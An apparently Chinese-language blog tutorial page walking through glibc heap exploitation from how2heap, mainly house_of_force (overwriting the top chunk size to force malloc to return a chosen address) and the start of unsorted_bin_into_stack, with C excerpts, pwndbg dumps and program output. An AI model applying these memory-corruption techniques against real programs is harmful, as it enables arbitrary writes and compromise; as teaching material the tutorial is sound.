<!DOCTYPE html>
<html lang="zh-cn">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="how2heap-4"/><meta name="keywords" content="pwn, QRZ's Blog" /><link rel="alternate" href="/blog/default" title="QRZ's Blog" ><link rel="shortcut icon" type="image/x-icon" href="/blog/favicon.ico?v=2.11.0" />
<link rel="canonical" href="http://www.qrzbing.cn/blog/2019/07/10/how2heap-4/"/>

<link rel="stylesheet" type="text/css" href="/blog/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/blog/css/style.css?v=2.11.0" />

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
</script>

    <title>how2heap-4 - QRZ's Blog</title>
  <meta name="generator" content="Hexo 5.3.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/blog/." class="logo">QRZ's Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/blog/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/blog/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/blog/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/blog/categories/">
        <li class="mobile-menu-item">Categories
          </li>
      </a><a href="/blog/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/blog/." class="logo">QRZ's Blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/blog/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/categories/">
            Categories
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">how2heap-4
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-07-10
        </span></div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap-4"><span class="toc-text">how2heap-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-force"><span class="toc-text">house_of_force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-text">解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%EF%BC%9A"><span class="toc-text">输出：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-into-stack"><span class="toc-text">unsorted_bin_into_stack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-1"><span class="toc-text">解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA"><span class="toc-text">输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-text">unsorted_bin_attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-2"><span class="toc-text">解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA-1"><span class="toc-text">输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#large-bin-attack"><span class="toc-text">large_bin_attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-3"><span class="toc-text">解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA-2"><span class="toc-text">输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-einherjar"><span class="toc-text">house_of_einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-4"><span class="toc-text">解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA-3"><span class="toc-text">输出</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol>
    </div>
  </div><div class="post-content"><h1 id="how2heap-4"><a href="#how2heap-4" class="headerlink" title="how2heap-4"></a>how2heap-4</h1><a id="more"></a>

<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><p>Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer</p>
<blockquote>
<p>house_of_force 是一种通过改写 top chunk 的 size 字段来欺骗 malloc 返回任意地址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。</p>
</blockquote>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>首先 malloc 一块内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fprintf(stderr, &quot;\nLet&#39;s allocate the first chunk, taking space from the wilderness.\n&quot;);</span><br><span class="line">intptr_t *p1 &#x3D; malloc(256);</span><br><span class="line">fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 273, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603110 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 134897, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x&#x2F;20gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000111      &lt;-- chunk p1</span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;10gx 0x603100</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0x0000000000020ef1      &lt;-- top chunk</span><br><span class="line">0x603120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603140:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们假设此时 p1 有溢出漏洞，我们可以去修改 top chunk 的 size：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10gx 0x603100</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0xffffffffffffffff      &lt;--  top chunk</span><br><span class="line">0x603120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603140:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们发现 top chunk 被修改为了一个很大的数。</p>
<blockquote>
<p>现在我们可以 malloc 一个任意大小的内存而不用调用 mmap 了。<br>接下来 malloc 一个 chunk，使得该 chunk 刚好分配到我们想要控制的那块区域为止，这样在下一次 malloc 时，就可以返回到我们想要控制的区域了。<br>计算方法是用目标地址减去 top chunk 地址，再减去 chunk 头的大小。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x &amp;bss_var </span><br><span class="line">$6 &#x3D; 0x602060</span><br><span class="line">pwndbg&gt; p&#x2F;x ptr_top </span><br><span class="line">$7 &#x3D; 0x603110</span><br><span class="line">pwndbg&gt; p&#x2F;x evil_size </span><br><span class="line">$4 &#x3D; 0xffffffffffffef30</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 273, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603110 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 18446744073709547329, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 4281, </span><br><span class="line">  fd &#x3D; 0x2073692073696854, </span><br><span class="line">  bk &#x3D; 0x676e697274732061, </span><br><span class="line">  fd_nextsize &#x3D; 0x6577207461687420, </span><br><span class="line">  bk_nextsize &#x3D; 0x6f7420746e617720</span><br><span class="line">&#125;</span><br><span class="line">0x603108 &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 0, </span><br><span class="line">  fd &#x3D; 0xffffffffffffef41, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就成功把 bss_var 分配了出来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg 0x602050</span><br><span class="line">0x602050:	0x0000000000000000	0x00000000000010b9</span><br><span class="line">0x602060 &lt;bss_var&gt;:	0x2073692073696854	0x676e697274732061</span><br><span class="line">0x602070 &lt;bss_var+16&gt;:	0x6577207461687420	0x6f7420746e617720</span><br><span class="line">0x602080 &lt;bss_var+32&gt;:	0x6972777265766f20	0x00000000002e6574</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020a0 &lt;stderr@@GLIBC_2.2.5&gt;:	0x00007ffff7dd2540	0x0000000000000000</span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;20s 0x602050</span><br><span class="line">0x602050:	&quot;&quot;</span><br><span class="line">0x602051:	&quot;&quot;</span><br><span class="line">0x602052:	&quot;&quot;</span><br><span class="line">0x602053:	&quot;&quot;</span><br><span class="line">0x602054:	&quot;&quot;</span><br><span class="line">0x602055:	&quot;&quot;</span><br><span class="line">0x602056:	&quot;&quot;</span><br><span class="line">0x602057:	&quot;&quot;</span><br><span class="line">0x602058:	&quot;\271\020&quot;</span><br><span class="line">0x60205b:	&quot;&quot;</span><br><span class="line">0x60205c:	&quot;&quot;</span><br><span class="line">0x60205d:	&quot;&quot;</span><br><span class="line">0x60205e:	&quot;&quot;</span><br><span class="line">0x60205f:	&quot;&quot;</span><br><span class="line">0x602060 &lt;bss_var&gt;:	&quot;This is a string that we want to overwrite.&quot;</span><br><span class="line">0x60208c:	&quot;&quot;</span><br><span class="line">0x60208d:	&quot;&quot;</span><br><span class="line">0x60208e:	&quot;&quot;</span><br><span class="line">0x60208f:	&quot;&quot;</span><br><span class="line">0x602090:	&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>接下来如果我们再申请一块内存：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 273, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603110 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 18446744073709547329, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 113, </span><br><span class="line">  fd &#x3D; 0x2073692073696854, </span><br><span class="line">  bk &#x3D; 0x676e697274732061, </span><br><span class="line">  fd_nextsize &#x3D; 0x6577207461687420, </span><br><span class="line">  bk_nextsize &#x3D; 0x6f7420746e617720</span><br><span class="line">&#125;</span><br><span class="line">0x6020c0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 4169, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603108 &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 0, </span><br><span class="line">  fd &#x3D; 0xffffffffffffef41, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p ctr_chunk </span><br><span class="line">$8 &#x3D; (void *) 0x602060 &lt;bss_var&gt;</span><br></pre></td></tr></table></figure>
<p>可以看出，bss_var 上的地址已经被分配。接下来就可以达到任意地址写的效果了。</p>
<h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;house_of_force</span><br><span class="line"></span><br><span class="line">Welcome to the House of Force</span><br><span class="line"></span><br><span class="line">The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><br><span class="line">The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.</span><br><span class="line"></span><br><span class="line">In the end, we will use this to overwrite a variable at 0x602060.</span><br><span class="line">Its current value is: This is a string that we want to overwrite.</span><br><span class="line"></span><br><span class="line">Let&#39;s allocate the first chunk, taking space from the wilderness.</span><br><span class="line">The chunk of 256 bytes has been allocated at 0x603000.</span><br><span class="line"></span><br><span class="line">Now the heap is composed of two chunks: the one we allocated and the top chunk&#x2F;wilderness.</span><br><span class="line">Real size (aligned and all that jazz) of our allocated chunk is 280.</span><br><span class="line"></span><br><span class="line">Now let&#39;s emulate a vulnerability that can overwrite the header of the Top Chunk</span><br><span class="line"></span><br><span class="line">The top chunk starts at 0x603110</span><br><span class="line"></span><br><span class="line">Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.</span><br><span class="line">Old size of top chunk 0x20ef1</span><br><span class="line">New size of top chunk 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.</span><br><span class="line">Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><br><span class="line">overflow) and will then be able to allocate a chunk right over the desired region.</span><br><span class="line"></span><br><span class="line">The value we want to write to at 0x602060, and the top chunk is at 0x603110, so accounting for the header size,</span><br><span class="line">we will malloc 0xffffffffffffef30 bytes.</span><br><span class="line">As expected, the new pointer is at the same place as the old top chunk: 0x603110</span><br><span class="line"></span><br><span class="line">Now, the next chunk we overwrite will point at our target buffer.</span><br><span class="line">malloc(100) &#x3D;&gt; 0x602060!</span><br><span class="line">Now, we can finally overwrite that value:</span><br><span class="line">... old string: This is a string that we want to overwrite.</span><br><span class="line">... doing strcpy overwrite with &quot;YEAH!!!&quot;...</span><br><span class="line">... new string: YEAH!!!</span><br></pre></td></tr></table></figure>
<h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h2><p>Exploiting the overwrite of a freed chunk on unsorted bin freelist to return a nearly-arbitrary pointer.</p>
<blockquote>
<p>unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。 </p>
</blockquote>
<h3 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
<p>我们在 malloc victim 后还需要 malloc 一块内存 p1 以防止 free victim 后它被放入 top chunk。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure>
<p>接下来 free victim，它会被放入 unsorted bin 中。</p>
